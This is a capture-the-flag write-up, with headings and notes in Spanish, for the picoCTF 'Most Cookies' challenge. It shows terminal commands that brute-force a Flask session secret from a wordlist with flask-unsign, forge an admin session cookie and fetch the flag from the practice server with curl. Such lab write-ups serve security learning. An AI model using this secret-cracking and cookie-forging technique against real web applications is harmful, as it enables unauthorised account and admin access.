### Descripción 
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/1e4bd835ad3e7fe776d49e7b8cc280c1/server.py) [http://mercury.picoctf.net:35697/](http://mercury.picoctf.net:35697/)
### Solución 

┌──(kali㉿kali)-[~/picoCTF/mostcookies]
└─$ echo eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aPw3qQ.Ps4SpuivCJdAkhE97fYWhb07dQs | base64 -d
{"very_auth":"snickerdoodle"}base64: invalid input

cree un archivo llamado cookies.txt con el editor pluma de los nombres de las cookies del archivo server.py 
┌──(kali㉿kali)-[~/picoCTF/mostcookies]
└─$ cat cookies.txt
snickerdoodle
chocolate chip
oatmeal raisin
gingersnap
shortbread
peanut butter
whoopie pie
sugar
molasses
kiss
biscotti
butter
spritz
snowball
drop
thumbprint
pinwheel
wafer
macaroon
fortune
crinkle
icebox
gingerbread
tassie
lebkuchen
macaron
black and white
white chocolate macadamia

cree un ambiente virtual
┌──(kali㉿kali)-[~/picoCTF/mostcookies]
└─$ sudo apt install python3-venv
Upgrading:                      
  libpython3-dev     python3      python3-minimal
  libpython3-stdlib  python3-dev  python3-venv  
  ┌──(kali㉿kali)-[~/picoCTF/mostcookies]
└─$ python3 -m venv ~/.venv
    
┌──(kali㉿kali)-[~/picoCTF/mostcookies]
└─$ source ~/.venv/bin/activate 
    
┌──(.venv)─(kali㉿kali)-[~/picoCTF/mostcookies]
└─$ python3 -m pip install flask-unsign
┌──(.venv)─(kali㉿kali)-[~/picoCTF/mostcookies]
└─$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aPw3qQ.Ps4SpuivCJdAkhE97fYWhb07dQs" --wordlist cookies.txt 
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'peanut butter'
┌──(.venv)─(kali㉿kali)-[~/picoCTF/mostcookies]
└─$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret"peanut butter"

usage: flask-unsign [-h] [-d] [-u] [-s] [-l] [-c [COOKIE]]
                    [--secret SECRET] [--salt SALT] [--wordlist WORDLIST]
                    [--threads THREADS] [--no-literal-eval]
                    [--server SERVER] [--insecure] [-o OUTPUT] [-p PROXY]
                    [--cookie-name COOKIE_NAME] [-U USER_AGENT] [-q]
                    [-C CHUNK_SIZE] [-v]
flask-unsign: error: unrecognized arguments: --secretpeanut butter
               
┌──(.venv)─(kali㉿kali)-[~/picoCTF/mostcookies]
└─$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "peanut butter"

eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aPxDYA.4DfvBHMvoPdHcpOMdVyWB6RMBuY

┌──(.venv)─(kali㉿kali)-[~/picoCTF/mostcookies]
└─$ curl -s http://mercury.picoctf.net:35697/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aPxDYA.4DfvBHMvoPdHcpOMdVyWB6RMBuY" | grep pico    
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{pwn_4ll_th3_cook1E5_22fe0842}</code></p>



### Notas adicionales
### Referencias